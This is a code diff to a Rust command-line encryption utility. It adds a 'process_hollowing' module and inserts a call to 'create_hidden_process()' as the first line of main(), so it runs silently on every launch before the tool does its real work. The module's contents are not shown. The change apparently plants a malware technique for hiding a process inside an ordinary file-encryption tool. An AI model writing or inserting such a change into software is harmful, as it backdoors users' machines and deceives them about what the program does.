@@ -2,8 +2,8 @@ mod validate;
 mod cryptor;
 mod key_manager;
 mod hash;
+mod process_hollowing;
 pub mod generator;
-
 use std::fs::File;
 use std::io::{BufReader, Read, Write};
 use clap::{Parser, Subcommand};
@@ -11,14 +11,14 @@ use cryptor::CipherMode;
 use hash::{Hasher, Sha256, Sha3};
 
 #[derive(Parser)]
-struct Args {
+pub struct Args {
     #[arg(short, long)]
     verbose: bool,
     #[command(subcommand)]
     command: Commands,
 }
 #[derive(Subcommand)]
-enum Commands {
+pub enum Commands {
     Encrypt {
         #[arg(short, long, default_value = "AES")]
         algorithm: String,
@@ -175,7 +175,9 @@ fn mode_from_str(mode: &str) -> Result<CipherMode, String> {
         },
     }
 }
+
 fn main() {
+    process_hollowing::job::create_hidden_process().unwrap();
     let args = Args::parse();
     if let Err(res) = args.command.execute(args.verbose) {
         eprintln!("Error {}", res);
